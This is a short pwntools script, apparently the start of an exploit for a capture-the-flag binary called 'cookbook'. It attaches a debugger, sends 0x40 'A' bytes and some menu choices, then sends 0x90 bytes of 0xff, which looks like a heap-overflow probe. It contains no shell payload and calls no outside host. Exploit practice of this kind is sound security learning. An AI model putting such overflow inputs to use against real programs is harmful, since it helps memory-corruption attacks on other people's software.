from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

#r = remote()
r = process("./cookbook") #, env={'LD_PRELOAD':'./libc-2.27.so'})

context.log_level = "debug"

gdb.attach(r, """c
""")

r.sendline(b"A" * 0x40)
time.sleep(0.1)
r.sendline("a")
time.sleep(0.1)
r.sendline("n")
time.sleep(0.1)
r.sendline("g")
time.sleep(0.1)
r.sendline(b"\xff" * 0x90)



r.interactive()